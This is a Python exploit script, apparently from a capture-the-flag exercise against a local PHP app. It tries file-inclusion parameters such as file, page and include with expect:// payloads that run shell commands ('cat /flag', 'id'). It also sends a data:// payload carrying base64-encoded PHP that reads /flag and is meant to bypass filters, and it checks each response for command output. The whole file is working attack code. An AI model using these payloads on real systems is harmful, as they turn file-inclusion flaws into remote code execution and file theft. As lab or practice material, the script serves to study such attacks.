import requests
import base64

base_url = "http://127.0.0.1:32824"

print("Testing RCE via expect:// wrapper with actual command execution...")
print("=" * 60)

# The expect:// wrapper allows us to execute system commands
# Let's try with different parameters
param_names = ['file', 'include', 'page', 'inc', 'img', 'view', 'path', 'loc']

# Test commands
test_cmd = "cat /flag"

for param in param_names:
    print(f"\nTesting {param}=expect://cat /flag")
    url = f"{base_url}/index.php?{param}=expect://{test_cmd}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response length: {len(resp.content)}")
        if len(resp.content) < 2000:
            print(f"Response: {repr(resp.text[:1000])}")
        
        # Check if we got flag
        if 'FLAG{' in resp.text:
            print(f"[!] FLAG FOUND via {param}!")
            break
    except Exception as e:
        print(f"Error: {e}")

# Try simpler command
print("\n" + "=" * 60)
print("Testing with 'id' command...")
for param in ['file', 'include', 'page']:
    url = f"{base_url}/index.php?{param}=expect://id"
    try:
        resp = requests.get(url, timeout=10)
        print(f"\n{param}=expect://id status: {resp.status_code}")
        print(f"Response: {repr(resp.text[:500])}")
        
        # Check for command output indicators
        if 'uid=' in resp.text:
            print(f"[!] Command execution confirmed via {param}!")
    except Exception as e:
        print(f"Error: {e}")

# Try base64 encoded command to bypass filters
print("\n" + "=" * 60)
print("Testing with base64 encoded commands...")

# Create a PHP one-liner that reads and displays the flag
php_oneliner = b"<?php echo file_get_contents('/flag'); ?>"
b64_php = base64.b64encode(php_oneliner).decode()

for param in ['file', 'include', 'page']:
    # Try data:// wrapper with base64
    payload = f"data://text/plain;base64,{b64_php}"
    url = f"{base_url}/index.php?{param}={payload}"
    
    try:
        resp = requests.get(url, timeout=10)
        print(f"\ndata:// wrapper via {param} status: {resp.status_code}")
        print(f"Response length: {len(resp.content)}")
        if len(resp.content) < 2000:
            print(f"Response: {repr(resp.text[:500])}")
            if 'FLAG{' in resp.text:
                print(f"[!] FLAG found!")
                break
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "=" * 60)
print("RCE testing complete.")
